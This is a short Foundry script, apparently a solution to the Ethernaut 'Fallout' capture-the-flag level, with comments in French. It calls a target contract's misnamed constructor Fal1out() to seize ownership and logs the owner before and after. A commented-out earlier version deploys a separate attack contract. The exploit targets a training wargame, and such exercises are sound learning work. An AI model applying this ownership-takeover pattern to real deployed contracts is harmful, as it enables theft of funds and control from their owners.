// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/FalloutAttack.sol";

// contract SolveFallout is Script {

//     function run() external {
//         address target = 0x1e9c1157eb672d2aa12565f900b3e305EA6D3ccc;
//         uint256 privateKey = vm.envUint("PRIVATE_KEY");

//         vm.startBroadcast(privateKey);

//         FalloutAttack attacker = new FalloutAttack;

//         console.log("Owner avant attack: ", IFallout(target).owner());

//         attacker.attack(target);

//         console.log("Owner apres attack: ", IFallout(target).owner());

//         vm.stopBroadcast();
//     }
// }

contract SolveFallout2 is Script {

    function run() external {
        address target = 0xa3DCc325956176e3b55C0161C6b65a8F6001d149;
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        console.log("Owner avant attack: ", IFallout(target).owner());

        IFallout(target).Fal1out();

        console.log("Owner apres attack: ", IFallout(target).owner());

        vm.stopBroadcast();
    }
}